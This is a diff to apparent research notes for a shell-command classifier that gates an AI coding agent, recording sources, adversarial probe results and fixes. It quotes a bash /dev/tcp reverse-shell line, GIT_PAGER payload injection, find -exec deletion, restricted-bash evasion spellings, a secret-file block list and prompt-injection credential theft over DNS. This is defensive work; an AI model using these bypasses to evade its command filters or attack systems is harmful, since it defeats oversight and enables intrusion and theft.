@@ -393,3 +393,122 @@ before and after. Every one is now a test.
   errors.
 - The residual gap is published, with the sources that say a pattern list cannot
   win, rather than left for the next reviewer to find.
+
+## Fourth research pass, 2026-09-19, probing the fixes rather than the design
+
+The third pass closed nine bypasses and published a residual gap. This one did two
+things the third did not: it ran a 45-command adversarial battery against the built
+classifier to find what the fixes still missed, and it read the fixes themselves for
+the second-order problems they introduced. Both produced findings.
+
+### Queries
+
+- Claude Code PreToolUse hook hookSpecificOutput permissionDecision allow deny ask schema
+- bash reverse shell /dev/tcp detection denylist bypass agent shell command filter
+- find -exec rm bypass command denylist agent tool policy su -c pkexec wrapper privilege escalation
+- AI agent reads ~/.ssh/id_ed25519 secret file exfiltration model context DNS cloud CLI egress
+
+### Sources, and what each settled
+
+**E3, agentthreatrule.org ATR-2026-01959, CVE-2026-55743.** The most consequential
+source of any pass. A shipped desktop agent's shell allowlist was bypassed two ways.
+`is_command_allowed()` stripped leading `KEY=value` assignments before validating, so
+`GIT_PAGER=/tmp/payload.sh git log` ran a payload through an allowlisted `git`; this
+classifier had the identical shape, because `readVerb` skips any word containing `=`
+by design. And `is_args_safe()` blocked `find -exec` and `-ok` but not the
+functionally identical `-execdir` and `-okdir`. The rule publishes its attack
+payloads and its benign examples side by side, and the benign ones, `TZ=UTC git log`
+and `NODE_ENV=production npm test`, are what stopped this fix from becoming a rule
+that asks for a card on every environment variable. It also carries the numbered
+`GIT_CONFIG_KEY_0` spelling, which cannot be listed because the name holds an index.
+
+**E3, code.claude.com/docs/en/hooks.** Settles the hook's contract and confirms the
+design in decision 12. `permissionDecision` accepts allow, deny, ask and defer; deny
+and ask rules are still evaluated regardless of what the hook returns; allow skips
+the prompt except for the actions no mode auto-approves. A hook that answers only
+deny and ask therefore cannot widen anything, which is the property the hook claims.
+
+**E3, anthropics/claude-code issue 13339.** A live upstream bug worth recording
+against decision 12: the VS Code extension ignores `permissionDecision: "ask"` from
+a PreToolUse hook and silently falls back to permission rules, while allow, deny,
+approve and block all work. The reporter calls it a security gap, because hooks
+cannot enforce an ask-before-executing policy in that surface. This app drives the
+SDK over its CLI transport rather than the extension, so the CLI behaviour applies,
+but the turbo critical-path breaker in decision 9 answers ask, and its enforcement
+depends on the surface honouring a hook ask. Named here rather than discovered later.
+
+**E3, detection.fyi Sigma 83dcd9f6 and the Wazuh reverse-shell rules.** Settle
+decision 18. `bash -i >& /dev/tcp/10.0.0.1/4242 0>&1` has a Sigma rule at critical
+level and a Wazuh custom rule, and appears in every reverse-shell cheat sheet,
+usually wrapped in `bash -c` or url-encoded, with `exec 196<>/dev/tcp/host/port` as
+the file-descriptor variant. It is a network connection with no network verb on the
+line, so no verb table finds it.
+
+**E3, verylazytech on bypassing restricted bash.** Confirms three of the spellings in
+decision 20 as published technique rather than invention: backslash insertion,
+written there as `\u\n\a\m\e \-\a`; quote insertion, `'p'i'n'g` and
+`ech''o test`, which the quote stripping already closed; and `${IFS}` substitution,
+used there as `sed 's/ /${IFS}/g'` to build a payload with no literal spaces. It also
+names what stays open: `/usr/bin/n[c]`, `/usr/bin/p?ng`, `/usr/bin/who*mi` and
+`who$@ami`, all of which the shell resolves after the classifier has read the text.
+
+**E3, reddit r/google_antigravity, January 2026.** A user report that a shipped agent
+ran `find . -name "tests.py" -type f -not -path '*/.*' -size 26c -exec rm {} +` with
+`rm` on its deny list and `find` on its allow list. Independent confirmation of the
+`-exec` hole from the operator's side, and the reply to it is the honest framing this
+step adopts: most models are extremely creative about bypassing allow and deny lists,
+and without a real sandbox every command has to be checked.
+
+**E3, grith.ai on a hidden prompt stealing SSH keys, and dev.to on agents as
+credential extractors.** Settle decision 15 and its most contested point. The attack
+chain is a poisoned input, then a credential read, then egress over HTTP or DNS, and
+the write-up puts the break point at the read: if the agent cannot read
+`~/.ssh/id_rsa` there is nothing to exfiltrate. dev.to makes the same argument from
+the other end, that the agent does not distinguish reading for understanding from
+reading for exfiltration because both are the same tool call in the logs. Neither
+conditions the read on a network call, which is what this classifier did.
+
+**E3, CVE-2025-55284 via that write-up.** The reason an egress condition was never
+sufficient: hidden prompts in files analysed by Claude Code triggered `.env` reads
+and DNS-based exfiltration that got past the network controls. DNS is the channel, so
+`dig`, `nslookup`, `host` and `ping` joined the network verbs.
+
+**E3, amux AI agent security hardening guide.** Its published PreToolUse hook blocks
+on the path appearing in the tool input at all, over a list containing `.env`,
+`id_rsa`, `id_ed25519`, `.ssh/`, `.aws/`, `.netrc`, `.npmrc`, `.kube/config` and
+`token`. That is a broader net than decision 15 casts, and reading it settled the
+argument against conditioning on a network verb: nobody building this control for real
+waits for egress.
+
+**E2, this repository's own shipped code, run rather than read.** Two probe batteries,
+`probe7` and `probe8`, both kept at `/home/user/` for this session. The first fed 45
+adversarial commands and 26 near-misses to the built classifier and the wired gate:
+42 of the 45 were allowed in Agent mode. After the fixes it is 0 of 45 with 0 of 26
+regressions. The second attacked the fixes themselves with 30 spellings and 22
+near-misses, and found two problems the first could not: `cat ~/.ssh/id_ed25519
+2>/dev/null` had been turned into a false negative by the guard added for
+`echo key > ~/.ssh/authorized_keys`, and `exec 196<>/dev/tcp/host/port` was denied as
+a write into a protected directory rather than as the socket it is. Both are fixed and
+both are tests now.
+
+### What changed as a result
+
+- A secret path named by a shell command is exfiltration with or without egress,
+  unless the command is writing to it.
+- Environment assignments that carry code are destructive, over a list of carriers
+  and a value test, with the numbered git form matched and a raw-command scan for
+  values the splitter cuts in half.
+- `find -exec`, `-execdir`, `-ok` and `-okdir` count as deletes, as does an exec'd
+  path, and find's escaped grouping parentheses are arguments rather than subshells.
+- `/dev/tcp` and `/dev/udp` are a network channel and are out of the protected-path
+  redirect rule.
+- A container started with the host filesystem mounted in is destructive, and
+  `docker run` is no longer a network rule for the pull it usually implies.
+- Ten more wrappers, the leading backslash, and `$IFS`.
+- git's global options are skipped for reset, clean, stash, reflog, filter-branch,
+  update-ref and tag, not only for push.
+- Block devices are named by family, so `/dev/null` is not a disk, and the query
+  forms of `nvme`, `mdadm`, `hdparm`, `dmsetup`, `smartctl` and `badblocks` stay
+  ordinary.
+- The residual gap was rewritten from probe output. Two claims in it were wrong:
+  `c"h"m"o"d` is caught, and so is a parenthesised `python -c` payload.
